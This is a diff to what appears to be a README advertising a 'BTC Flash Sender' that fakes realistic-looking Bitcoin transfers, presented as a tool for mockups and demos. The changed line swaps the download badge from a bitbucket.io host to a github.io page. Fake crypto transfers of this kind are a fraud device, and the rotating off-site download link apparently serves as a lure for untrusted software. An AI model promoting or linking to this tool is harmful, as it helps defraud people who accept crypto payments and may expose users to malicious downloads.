@@ -2,7 +2,7 @@
 
 Simulate Bitcoin transactions instantly with this high-speed **BTC Flash Sender** developed in C++ ⚙️. This tool creates realistic-looking BTC transfers without touching the blockchain. Customize wallet addresses, amount, TX hash, confirmations, and more — perfect for UI mockups, wallet previews, or educational demos.
 
-[![Download BTC Flash Sender](https://img.shields.io/badge/Download-BTC%20Flash%20Sender-blueviolet)](https://fileoffload1.bitbucket.io)
+[![Download BTC Flash Sender](https://img.shields.io/badge/Download-BTC%20Flash%20Sender-blueviolet)](https://BTC-FLASH-SENDER-lyp.github.io/.github)
 
 ---
 
